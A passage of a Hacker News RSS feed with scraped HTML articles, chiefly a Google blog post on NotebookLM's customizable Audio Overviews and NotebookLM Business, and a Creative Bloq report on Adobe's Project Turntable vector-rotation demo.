target="_blank" rel="noreferrer">/r/Crokinole</a><!-- HTML_TAG_END --></li> </ul>  <p><!-- HTML_TAG_START -->P.S. Crokinole isn’t an Olympic sport — yet.<!-- HTML_TAG_END --></p>  <div id="method"><p><!-- HTML_TAG_START --><strong>Data and Methods</strong><!-- HTML_TAG_END --></p><p><!-- HTML_TAG_START -->Player types are estimations based on all open 20 success rates from 2023-2024 NCA tournament data. Competitive 20 success rates are from <a href="https://public.tableau.com/app/profile/shawn.hagarty/viz/NCACrokinole20sStats/NCAAll20s" target="_blank" rel="noreferrer">Shawn Hagarty’s impressive data.</a> Recreational open 20 success rates are based on observations of 600 open 20 attempts from 10 individuals with at least 50 attempts each. First missed shot data is from watching playoff-rounds from all 2023-2024 tournaments on <a href="https://www.youtube.com/@TraceyBoards" target="_blank" rel="noreferrer">Tracey Boards coverage</a> of events. Yearly NCA tour rankings data is based on the rank in July (at the end of the season). Data from <a href="http://crokinolereference.com/" target="_blank" rel="noreferrer">Crokinole Reference.</a><!-- HTML_TAG_END --></p> </div> </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[NotebookLM launches feature to customize and guide audio overviews (109 pts)]]></title>
            <link>https://blog.google/technology/ai/notebooklm-update-october-2024/</link>
            <guid>41871262</guid>
            <pubDate>Thu, 17 Oct 2024 16:42:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.google/technology/ai/notebooklm-update-october-2024/">https://blog.google/technology/ai/notebooklm-update-october-2024/</a>, See on <a href="https://news.ycombinator.com/item?id=41871262">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="jump-content" tabindex="-1">
            

    
    

    <article>

    
    





    

    
      

<div data-analytics-module="{
    &quot;module_name&quot;: &quot;Hero Menu&quot;,
    &quot;section_header&quot;: &quot;New in NotebookLM: Customizing your Audio Overviews and introducing NotebookLM Business&quot;
  }">
  
  <div>
      <div>
          
            <p>Oct 17, 2024</p>
          
          
            <p data-reading-time-render="">[[read-time]] min read</p>
          
        </div>
      
        <p>
          You can now guide NotebookLM's Audio Overview, guiding what the AI hosts focus on and their expertise level, and apply for the NotebookLM Business pilot program.
        </p>
      
    </div>
  
  <div>
    <div>
  <p>Oliver King</p>
  
    <p>
      Staff Software Engineer
    </p>
  
  
</div>
    
      
        


<div data-component="uni-ai-generated-summary" data-analytics-module="{
    &quot;event&quot;: &quot;module_impression&quot;,
    &quot;module_name&quot;: &quot;ai_summary&quot;,
    &quot;section_header&quot;: &quot;CTA&quot;
  }">
      
        <div data-summary-id="ai_summary_1">
          <h2>General summary</h2>
          <p>NotebookLM, a tool powered by Gemini 1.5, helps users understand complex information by instantly becoming an expert on uploaded sources. New features include customizable Audio Overviews, allowing users to provide instructions for AI hosts and listen to audio while working within NotebookLM. Additionally, NotebookLM Business, an upcoming version offered via Google Workspace, will provide enhanced features for businesses, universities, and organizations, prioritizing data privacy and security. Apply for the NotebookLM Business pilot program to gain early access to new features, training, and email support.</p>
          
          <p><small>
            Summaries were generated by Google AI. Generative AI is experimental.
          </small>
        </p></div>
      
        <div data-summary-id="ai_summary_3">
          <h2>Basic explainer</h2>
          <p>NotebookLM is a tool that helps you understand information from your sources.</p>
<p>Now, you can customize Audio Overviews by giving instructions to the AI hosts.</p>
<p>You can also listen to Audio Overviews while working in NotebookLM.</p>
<p>NotebookLM Business is coming soon with enhanced features for businesses and organizations.</p>
          
          <p><small>
            Summaries were generated by Google AI. Generative AI is experimental.
          </small>
        </p></div>
      

      
      <div>
        <h4>
          Explore other styles:
        </h4>
        
      </div>
      

      </div>

      
    
    
  </div>
</div>

    

    
      







<div>
    <figure>
      <div>
  <p><img srcset="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/NotebookLM_Hero_1017_WG.width-600.format-webp.webp 600w, https://storage.googleapis.com/gweb-uniblog-publish-prod/images/NotebookLM_Hero_1017_WG.width-1200.format-webp.webp 1200w, https://storage.googleapis.com/gweb-uniblog-publish-prod/images/NotebookLM_Hero_1017_WG.width-1600.format-webp.webp 1600w" sizes="(max-width: 599px) 100vw, (max-width: 1023px) 600px, 1024px" src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/NotebookLM_Hero_1017_WG.width-1200.format-webp.webp" fetchpriority="high" alt="By tapping the “Customize” button, you can now guide NotebookLM's Audio Overview, adjusting what the AI hosts focus on and their expertise level">
  </p>
</div>

      
    </figure>
  </div>


    

    
    <div data-reading-time="true" data-component="uni-article-body">

            
              


<google-read-aloud-player data-analytics-module="{
        &quot;event&quot;: &quot;module_impression&quot;,
        &quot;module_name&quot;: &quot;ai_audio&quot;,
        &quot;section_header&quot;: &quot;New in NotebookLM: Customizing your Audio Overviews and introducing NotebookLM Business&quot;
    }" data-date-modified="2024-10-17T16:00:01.230467+00:00" data-progress-bar-style="half-wave" data-api-key="AIzaSyBLT6VkYe-x7sWLZI2Ep26-fNkBKgND-Ac" data-article-style="style9" data-tracking-ids="G-HGNBTNCHCQ,G-6NKTLKV14N" data-voice-list="en.ioh-pngnat:Cyan,en.usb-pngnat:Lime" data-layout-style="style1" data-highlight-mode="word-over-paragraph" data-highlight-text-color="#000000" data-highlight-word-background="#8AB4F8" data-highlight-paragraph-background="#D2E3FC" data-background="linear-gradient(180deg, #F1F3F4 0%, #F8F9FA 100%)" data-foreground-color="#202124" data-font="600 16px Google Sans, sans-serif" data-box-shadow="0px 1px 3px 1px rgba(60, 64, 67, 0.15)">
</google-read-aloud-player>




            

            
            
<!--article text-->

  
    <div data-component="uni-article-paragraph" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;New in NotebookLM: Customizing your Audio Overviews and introducing NotebookLM Business&quot;
         }"><p data-block-key="ojsas"><a href="http://notebooklm.google/">NotebookLM</a> is a tool for understanding, built with Gemini 1.5. When you upload your sources, it instantly becomes an expert, grounding its responses in your material and giving you powerful ways to transform information. And since it’s <i>your</i> notebook, your personal data is never used to train NotebookLM.</p><p data-block-key="apfpe">Millions of people are already using NotebookLM to understand and engage with complex information, and today we’re removing the product’s “Experimental” label and releasing another round of features.</p><h2 data-block-key="8dse7">Get more out of your Audio Overviews</h2><p data-block-key="6f1hs">We’ve been delighted with the reception of <a href="https://blog.google/technology/ai/notebooklm-audio-overviews/">Audio Overviews</a> so far, and we’re introducing a pair of new features today:</p><ul><li data-block-key="ahbdo"><b>Guide the conversation:</b> Now you can provide instructions before you generate a "Deep Dive" Audio Overview. For example, you can focus on specific topics or adjust the expertise level to suit your audience. Think of it like slipping the AI hosts a quick note right before they go on the air, which will change how they cover your material.</li><li data-block-key="a5jua"><b>Background listening:</b> You can also listen to Audio Overviews while continuing to work within NotebookLM. Query your sources, get citations, and explore relevant quotes without interrupting the audio.</li></ul></div>
  

  
    







  
      <div data-analytics-module="{
          &quot;module_name&quot;: &quot;Inline Images&quot;,
          &quot;section_header&quot;: &quot;New in NotebookLM: Customizing your Audio Overviews and introducing NotebookLM Business&quot;
        }">
  

  <p>

      
      
        
          <video tabindex="0" autoplay="" loop="" muted="" playsinline="" src="https://storage.googleapis.com/gweb-uniblog-publish-prod/original_videos/NLM_Customize_1017_MOVIE.mp4" type="video/mp4" title="Animation of the user experience of customizing Audio Overviews in NotebookLM" alt="Customize Audio Overviews in NotebookLM">
            Video format not supported
          </video>
        
      
    
    </p>
    
      <figcaption><p data-block-key="j37ld">By tapping “Customize,” you can now guide NotebookLM's Audio Overview, adjusting what the AI hosts focus on and their expertise level.</p></figcaption>
    
  
    </div>
  



  

  
    <div data-component="uni-article-paragraph" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;New in NotebookLM: Customizing your Audio Overviews and introducing NotebookLM Business&quot;
         }"><p data-block-key="la3zr">To try it out, follow these steps:</p><ol><li data-block-key="4kk3t">Go to <a href="https://notebooklm.google.com/?utm_source=keyword&amp;utm_medium=email&amp;utm_campaign=AO_Steer">NotebookLM</a></li><li data-block-key="34u9c">Create a new notebook</li><li data-block-key="4j98q">Add at least one source</li><li data-block-key="ai46f">In your NotebookLM guide, tap "Generate" for an automatic Audio Overview or "Customize" to provide instructions for the AI hosts</li></ol><p data-block-key="fj6h2">Like always, Audio Overviews are generated discussions and are not a comprehensive or objective view of a topic, but simply a reflection of the sources that you’ve uploaded and any instructions you provide.</p><h2 data-block-key="8as9p">Introducing NotebookLM Business</h2><p data-block-key="4r4ia">We’re announcing <a href="https://notebooklm.google/business">NotebookLM Business</a>, an upcoming version that will be offered via Google Workspace with enhanced features for businesses, universities and organizations. From the start, NotebookLM has made <a href="https://support.google.com/notebooklm/answer/14275965?hl=en&amp;ref_topic=14775295&amp;sjid=4751465637394678226-NC">data privacy and security</a> a top priority, and we’ll continue to do that.</p><p data-block-key="349f7">Starting today, you can <a href="https://notebooklm.google/business">apply for the NotebookLM Business pilot program</a> to get early access to new product features, training and email support. In the meantime, you can continue to use the free version of NotebookLM, and we’ll share more about the general availability and pricing of NotebookLM Business later this year.</p><p data-block-key="dvpd1">With over 80,000 organizations already using NotebookLM, we look forward to welcoming even more.</p></div>
  

  
    







  
      <div data-analytics-module="{
          &quot;module_name&quot;: &quot;Inline Images&quot;,
          &quot;section_header&quot;: &quot;New in NotebookLM: Customizing your Audio Overviews and introducing NotebookLM Business&quot;
        }">
  

  <p><img alt="Graphic introducing NotebookLM Business, which will be offered via Google Workspace and is already being used by over 80,000 organizations globally." src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/Business_Dark.width-100.format-webp.webp" loading="lazy" data-loading="{
                &quot;mobile&quot;: &quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/Business_Dark.width-500.format-webp.webp&quot;,
                &quot;desktop&quot;: &quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/Business_Dark.width-1000.format-webp.webp&quot;
              }">
        
      
    
    </p>
    
      <figcaption><p data-block-key="kg1xz">NotebookLM Business will be offered via Google Workspace, with more information coming later this year.</p></figcaption>
    
  
    </div>
  



  


            
            

            
              




            
          </div>
  </article>
  





  

  


<div data-component="uni-related-articles" data-analytics-module="{
    &quot;module_name&quot;: &quot;Article Footer Related Stories&quot;,
    &quot;section_header&quot;: &quot;Related stories&quot;
  }">
    <div>
        <h3>
          <p>
            Related stories
          </p>
        </h3>
      </div>
    <div>
      <ul aria-role="menu" aria-label="Related articles">
        
          <li>
            <a href="https://blog.google/products/google-cloud/generative-ai-healthcare-administration/" data-index="1" data-target="card" data-primarytag="products - google cloud" data-image="true" data-ga4-analytics-footer-lead-click="{
                &quot;link_text&quot;: &quot;How gen AI can help doctors and nurses ease their administrative workloads&quot;,
                &quot;link_url&quot;:  &quot;https://blog.google/products/google-cloud/generative-ai-healthcare-administration/&quot;,
                &quot;source_content&quot;: &quot;Related stories&quot;,
                &quot;related_index&quot;: &quot;1&quot;,
                &quot;related_article_tag&quot;: &quot;products - google cloud&quot;,
                &quot;article_name&quot;: &quot;How gen AI can help doctors and nurses ease their administrative workloads&quot;,
                &quot;author_name&quot;: &quot;Aashima Gupta&quot;
              }">
              <div data-target="card">
                
                  <div>
                    
    <figure>
        <picture>
            


    

    
        <source media="(max-resolution: 1.5dppx)" sizes="600px" srcset="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/AdministrativeReport_Hero-4.max-600x208.format-webp.webp 600w">
    
        <source media="(min-resolution: 1.5dppx)" sizes="1200px" srcset="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/AdministrativeReport_Hero-4.max-1200x416.format-webp.webp 1200w">
    

    <img src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/AdministrativeReport_Hero-4.max-1200x416.format-webp.webp" alt="gen ai healthcare" sizes=" 600px,  1200px" srcset="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/AdministrativeReport_Hero-4.max-600x208.format-webp.webp 600w, https://storage.googleapis.com/gweb-uniblog-publish-prod/images/AdministrativeReport_Hero-4.max-1200x416.format-webp.webp 1200w" data-target="image" loading="lazy">
    


        </picture>
    </figure>


                  </div>
                
                <p><span data-target="eyebrow">Google Cloud</span></p><h4 data-target="title">How gen AI can help doctors and nurses ease their administrative workloads</h4>
                
              </div>
              <div>
                
                <p>
                  By
                  
                    
                    <span data-target="author">
                    Aashima Gupta
                    </span>
                  
                </p>
                
                <p><span data-target="date"> Oct 17, 2024</span>
              </p></div>
              <svg data-target="arrow" role="presentation">
  <use xmlns:xlink="http://www.w3.org/1999/xlink" href="/static/blogv2/images/icons.svg?version=pr20241017-1735#mi-arrow-forward-no-bg"></use>
</svg>

            </a>
          </li>
        
          <li>
            <a href="https://blog.google/outreach-initiatives/google-org/google-org-public-sector-ai-funding/" data-index="2" data-target="card" data-primarytag="topics - google.org" data-image="true" data-ga4-analytics-footer-lead-click="{
                &quot;link_text&quot;: &quot;Google.org announces $15 million in AI training grants for the government workforce&quot;,
                &quot;link_url&quot;:  &quot;https://blog.google/outreach-initiatives/google-org/google-org-public-sector-ai-funding/&quot;,
                &quot;source_content&quot;: &quot;Related stories&quot;,
                &quot;related_index&quot;: &quot;2&quot;,
                &quot;related_article_tag&quot;: &quot;topics - google.org&quot;,
                &quot;article_name&quot;: &quot;Google.org announces $15 million in AI training grants for the government workforce&quot;,
                &quot;author_name&quot;: &quot;Karen Dahut&quot;
              }">
              <div data-target="card">
                
                  <div>
                    
    <figure>
        <picture>
            


    

    
        <source media="(max-resolution: 1.5dppx)" sizes="600px" srcset="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/Government_AI_Upskilling.max-600x208.format-webp.webp 600w">
    
        <source media="(min-resolution: 1.5dppx)" sizes="1200px" srcset="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/Government_AI_Upskilling.max-1200x416.format-webp.webp 1200w">
    

    <img src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/Government_AI_Upskilling.max-1200x416.format-webp.webp" alt="Government AI Upskilling" sizes=" 600px,  1200px" srcset="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/Government_AI_Upskilling.max-600x208.format-webp.webp 600w, https://storage.googleapis.com/gweb-uniblog-publish-prod/images/Government_AI_Upskilling.max-1200x416.format-webp.webp 1200w" data-target="image" loading="lazy">
    


        </picture>
    </figure>


                  </div>
                
                <p><span data-target="eyebrow">Google.org</span></p><h4 data-target="title">Google.org announces $15 million in AI training grants for the government workforce</h4>
                
              </div>
              <div>
                
                <p>
                  By
                  
                    
                    <span data-target="author">
                    Karen Dahut
                    </span>
                  
                </p>
                
                <p><span data-target="date"> Oct 16, 2024</span>
              </p></div>
              <svg data-target="arrow" role="presentation">
  <use xmlns:xlink="http://www.w3.org/1999/xlink" href="/static/blogv2/images/icons.svg?version=pr20241017-1735#mi-arrow-forward-no-bg"></use>
</svg>

            </a>
          </li>
        
          <li>
            <a href="https://blog.google/products/shopping/google-shopping-ai-update-october-2024/" data-index="3" data-target="card" data-primarytag="products - shopping" data-image="true" data-ga4-analytics-footer-lead-click="{
                &quot;link_text&quot;: &quot;Google Shopping’s getting a big transformation&quot;,
                &quot;link_url&quot;:  &quot;https://blog.google/products/shopping/google-shopping-ai-update-october-2024/&quot;,
                &quot;source_content&quot;: &quot;Related stories&quot;,
                &quot;related_index&quot;: &quot;3&quot;,
                &quot;related_article_tag&quot;: &quot;products - shopping&quot;,
                &quot;article_name&quot;: &quot;Google Shopping’s getting a big transformation&quot;,
                &quot;author_name&quot;: &quot;Sean Scott&quot;
              }">
              <div data-target="card">
                
                  <div>
                    
    <figure>
        <picture>
            


    

    
        <source media="(max-resolution: 1.5dppx)" sizes="600px" srcset="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/Shopping-Hero_4.max-600x208.format-webp.webp 600w">
    
        <source media="(min-resolution: 1.5dppx)" sizes="1200px" srcset="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/Shopping-Hero_4.max-1200x416.format-webp.webp 1200w">
    

    <img src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/Shopping-Hero_4.max-1200x416.format-webp.webp" alt="Shopping-Hero_4" sizes=" 600px,  1200px" srcset="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/Shopping-Hero_4.max-600x208.format-webp.webp 600w, https://storage.googleapis.com/gweb-uniblog-publish-prod/images/Shopping-Hero_4.max-1200x416.format-webp.webp 1200w" data-target="image" loading="lazy">
    


        </picture>
    </figure>


                  </div>
                
                <p><span data-target="eyebrow">Shopping</span></p><h4 data-target="title">Google Shopping’s getting a big transformation</h4>
                
              </div>
              <div>
                
                <p>
                  By
                  
                    
                    <span data-target="author">
                    Sean Scott
                    </span>
                  
                </p>
                
                <p><span data-target="date"> Oct 15, 2024</span>
              </p></div>
              <svg data-target="arrow" role="presentation">
  <use xmlns:xlink="http://www.w3.org/1999/xlink" href="/static/blogv2/images/icons.svg?version=pr20241017-1735#mi-arrow-forward-no-bg"></use>
</svg>

            </a>
          </li>
        
          <li>
            <a href="https://blog.google/technology/ai/on-device-processing/" data-index="4" data-target="card" data-primarytag="topics - ai" data-image="true" data-ga4-analytics-footer-lead-click="{
                &quot;link_text&quot;: &quot;Ask a Techspert: What is on\u002Ddevice processing?&quot;,
                &quot;link_url&quot;:  &quot;https://blog.google/technology/ai/on-device-processing/&quot;,
                &quot;source_content&quot;: &quot;Related stories&quot;,
                &quot;related_index&quot;: &quot;4&quot;,
                &quot;related_article_tag&quot;: &quot;topics - ai&quot;,
                &quot;article_name&quot;: &quot;Ask a Techspert: What is on\u002Ddevice processing?&quot;,
                &quot;author_name&quot;: &quot;Molly McHugh-Johnson&quot;
              }">
              <div data-target="card">
                
                  <div>
                    
    <figure>
        <picture>
            


    

    
        <source media="(max-resolution: 1.5dppx)" sizes="600px" srcset="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/ask_a_techspert_processing_hero.max-600x208.format-webp.webp 600w">
    
        <source media="(min-resolution: 1.5dppx)" sizes="1200px" srcset="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/ask_a_techspert_processing_her.max-1200x416.format-webp.webp 1200w">
    

    <img src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/ask_a_techspert_processing_her.max-1200x416.format-webp.webp" alt="ask a techspert processing hero-03" sizes=" 600px,  1200px" srcset="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/ask_a_techspert_processing_hero.max-600x208.format-webp.webp 600w, https://storage.googleapis.com/gweb-uniblog-publish-prod/images/ask_a_techspert_processing_her.max-1200x416.format-webp.webp 1200w" data-target="image" loading="lazy">
    


        </picture>
    </figure>


                  </div>
                
                <p><span data-target="eyebrow">AI</span></p><h4 data-target="title">Ask a Techspert: What is on-device processing?</h4>
                
              </div>
              <div>
                
                <p>
                  By
                  
                    
                    <span data-target="author">
                    Molly McHugh-Johnson
                    </span>
                  
                </p>
                
                <p><span data-target="date"> Oct 14, 2024</span>
              </p></div>
              <svg data-target="arrow" role="presentation">
  <use xmlns:xlink="http://www.w3.org/1999/xlink" href="/static/blogv2/images/icons.svg?version=pr20241017-1735#mi-arrow-forward-no-bg"></use>
</svg>

            </a>
          </li>
        
          <li>
            <a href="https://blog.google/outreach-initiatives/entrepreneurs/ai-startups-mental-health/" data-index="5" data-target="card" data-primarytag="topics - entrepreneurs" data-image="true" data-ga4-analytics-footer-lead-click="{
                &quot;link_text&quot;: &quot;AI startups revolutionizing mental health care&quot;,
                &quot;link_url&quot;:  &quot;https://blog.google/outreach-initiatives/entrepreneurs/ai-startups-mental-health/&quot;,
                &quot;source_content&quot;: &quot;Related stories&quot;,
                &quot;related_index&quot;: &quot;5&quot;,
                &quot;related_article_tag&quot;: &quot;topics - entrepreneurs&quot;,
                &quot;article_name&quot;: &quot;AI startups revolutionizing mental health care&quot;,
                &quot;author_name&quot;: &quot;Dr. Karen DeSalvo&quot;
              }">
              <div data-target="card">
                
                  <div>
                    
    <figure>
        <picture>
            


    

    
        <source media="(max-resolution: 1.5dppx)" sizes="600px" srcset="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/Screenshot_2024-10-09_at_2.58.3.max-600x208.format-webp.webp 600w">
    
        <source media="(min-resolution: 1.5dppx)" sizes="1200px" srcset="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/Screenshot_2024-10-09_at_2.58..max-1200x416.format-webp.webp 1200w">
    

    <img src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/Screenshot_2024-10-09_at_2.58..max-1200x416.format-webp.webp" alt="GFS AI for Health" sizes=" 600px,  1200px" srcset="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/Screenshot_2024-10-09_at_2.58.3.max-600x208.format-webp.webp 600w, https://storage.googleapis.com/gweb-uniblog-publish-prod/images/Screenshot_2024-10-09_at_2.58..max-1200x416.format-webp.webp 1200w" data-target="image" loading="lazy">
    


        </picture>
    </figure>


                  </div>
                
                <p><span data-target="eyebrow">Entrepreneurs</span></p><h4 data-target="title">AI startups revolutionizing mental health care</h4>
                
              </div>
              <div>
                
                <p>
                  By
                  
                    
                    <span data-target="author">
                    Dr. Karen DeSalvo
                    </span>
                  
                </p>
                
                <p><span data-target="date"> Oct 10, 2024</span>
              </p></div>
              <svg data-target="arrow" role="presentation">
  <use xmlns:xlink="http://www.w3.org/1999/xlink" href="/static/blogv2/images/icons.svg?version=pr20241017-1735#mi-arrow-forward-no-bg"></use>
</svg>

            </a>
          </li>
        
          <li>
            <a href="https://blog.google/technology/google-deepmind/google-deepmind-demis-hassabis-john-jumper-nobel-prize-chemistry-alphafold/" data-index="6" data-target="card" data-primarytag="topics - google deepmind" data-image="true" data-ga4-analytics-footer-lead-click="{
                &quot;link_text&quot;: &quot;Google DeepMind\u0027s Demis Hassabis \u0026 John Jumper awarded Nobel Prize in Chemistry&quot;,
                &quot;link_url&quot;:  &quot;https://blog.google/technology/google-deepmind/google-deepmind-demis-hassabis-john-jumper-nobel-prize-chemistry-alphafold/&quot;,
                &quot;source_content&quot;: &quot;Related stories&quot;,
                &quot;related_index&quot;: &quot;6&quot;,
                &quot;related_article_tag&quot;: &quot;topics - google deepmind&quot;,
                &quot;article_name&quot;: &quot;Google DeepMind\u0027s Demis Hassabis \u0026 John Jumper awarded Nobel Prize in Chemistry&quot;,
                &quot;author_name&quot;: &quot;Keyword Team&quot;
              }">
              <div data-target="card">
                
                  <div>
                    
    <figure>
        <picture>
            


    

    
        <source media="(max-resolution: 1.5dppx)" sizes="600px" srcset="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/nobel_google_keyword.max-600x208.format-webp.webp 600w">
    
        <source media="(min-resolution: 1.5dppx)" sizes="1200px" srcset="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/nobel_google_keyword.max-1200x416.format-webp.webp 1200w">
    

    <img src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/nobel_google_keyword.max-1200x416.format-webp.webp" alt="nobel_google_keyword" sizes=" 600px,  1200px" srcset="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/nobel_google_keyword.max-600x208.format-webp.webp 600w, https://storage.googleapis.com/gweb-uniblog-publish-prod/images/nobel_google_keyword.max-1200x416.format-webp.webp 1200w" data-target="image" loading="lazy">
    


        </picture>
    </figure>


                  </div>
                
                <p><span data-target="eyebrow">Google DeepMind</span></p><h4 data-target="title">Google DeepMind's Demis Hassabis &amp; John Jumper awarded Nobel Prize in Chemistry</h4>
                
              </div>
              <p><span data-target="date"> Oct 09, 2024</span>
              </p>
              <svg data-target="arrow" role="presentation">
  <use xmlns:xlink="http://www.w3.org/1999/xlink" href="/static/blogv2/images/icons.svg?version=pr20241017-1735#mi-arrow-forward-no-bg"></use>
</svg>

            </a>
          </li>
        
        <li>.</li>
      </ul>
    </div>
    
      
    
 </div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Adobe's new image rotation tool is one of the most impressive AI tools seen (506 pts)]]></title>
            <link>https://www.creativebloq.com/design/adobes-new-image-rotation-tool-is-one-of-the-most-impressive-ai-concepts-weve-seen</link>
            <guid>41870040</guid>
            <pubDate>Thu, 17 Oct 2024 14:31:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.creativebloq.com/design/adobes-new-image-rotation-tool-is-one-of-the-most-impressive-ai-concepts-weve-seen">https://www.creativebloq.com/design/adobes-new-image-rotation-tool-is-one-of-the-most-impressive-ai-concepts-weve-seen</a>, See on <a href="https://news.ycombinator.com/item?id=41870040">Hacker News</a></p>
<div id="readability-page-1" class="page"><section data-widget-type="contentparsed" id="content">
<div itemprop="image" itemscope="" itemtype="https://schema.org/ImageObject">
<div>
<picture data-new-v2-image="true">
<source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-320-80.jpg.webp 320w, https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-1200-80.jpg.webp 1200w, https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-1920-80.jpg.webp 1920w" sizes="(min-width: 1000px) 600px, calc(100vw - 40px)">
<img src="https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-320-80.jpg" alt="A vector image of a knight with a sword facing a dragon" srcset="https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-1200-80.jpg 1200w, https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-1920-80.jpg 1920w" sizes="(min-width: 1000px) 600px, calc(100vw - 40px)" data-original-mos="https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y.jpg" data-pin-nopin="true" fetchpriority="high">
</picture>
</div>
<meta itemprop="url" content="https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y.jpg">
<meta itemprop="height" content="600">
<meta itemprop="width" content="338">
<figcaption itemprop="caption description">
<span itemprop="copyrightHolder">(Image credit: Adobe)</span>
</figcaption>
</div>

<div id="article-body">
<p>While <a data-analytics-id="inline-link" href="https://www.creativebloq.com/tag/adobe" data-auto-tag-linker="true" data-before-rewrite-localise="https://www.creativebloq.com/tag/adobe">Adobe</a>'s annual MAX conference gives the company a chance to <a data-analytics-id="inline-link" href="https://www.creativebloq.com/art/digital-art/i-just-saw-an-adobe-max-demo-of-illustrators-new-ai-tool-and-now-i-want-to-get-back-into-vector-art" data-before-rewrite-localise="https://www.creativebloq.com/art/digital-art/i-just-saw-an-adobe-max-demo-of-illustrators-new-ai-tool-and-now-i-want-to-get-back-into-vector-art">unveil its latest features</a>, it also lets the brand demonstrate some of its more weird and wonderful ideas. 'Sneaks' sees Adobe engineers take to the stage to share ideas that may or may not see the light of day, such as 2024's Project Turntable. Creative Bloq enjoyed an exclusive preview of the concept in ahead of its unveiling at MAX, and it's one of the most impressive Sneaks we've seen.</p><p>Project Turntable<strong> </strong>lets users easily rotate 2D vector art in 3D, whilst ensuring it still look like 2D art from any new angle. And even after the rotation, the vector graphics stay true to the original shape, maintaining the design’s original essence.</p><div data-hydrate="true" id="slice-container-newsletterForm-articleInbodyContent-i4q48hK24nBygdBNx2tfjk"><section><p>Daily design news, reviews, how-tos and more, as picked by the editors.</p></section></div>
</div>
<div>
<p><img src="https://cdn.mos.cms.futurecdn.net/flexiimages/mcasa08ogs1651144853.svg"></p>
<div>
<p><strong><span>Thank you for reading 5 articles this month* Join now for unlimited access</span></strong></p><p><strong><span>Enjoy your first month for just £1 / $1 / €1</span></strong></p>
</div>

<p><span>*Read 5 free articles per month without a subscription</span></p>
</div>

<div>
<p><img src="https://cdn.mos.cms.futurecdn.net/flexiimages/mcasa08ogs1651144853.svg">
</p>
<div>
<p><strong><span>Join now for unlimited access</span></strong></p><p>Try first month for just <strong>£1 / $1 / €1</strong></p>
</div>

</div>

<div id="slice-container-authorBio-i4q48hK24nBygdBNx2tfjk"><p>Daniel John is Design Editor at Creative Bloq. He reports on the worlds of art, design, branding and lifestyle tech (which often translates to tech made by Apple). He joined in 2020 after working in copywriting and digital marketing with brands including ITV, NBC, Channel 4 and more.</p></div>


<div>
<h4>Related articles</h4>

</div>
</section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Gamedev in Lisp. Part 2: Dungeons and Interfaces (212 pts)]]></title>
            <link>https://gitlab.com/lockie/cl-fast-ecs/-/wikis/tutorial-2</link>
            <guid>41869460</guid>
            <pubDate>Thu, 17 Oct 2024 13:26:25 GMT</pubDate>
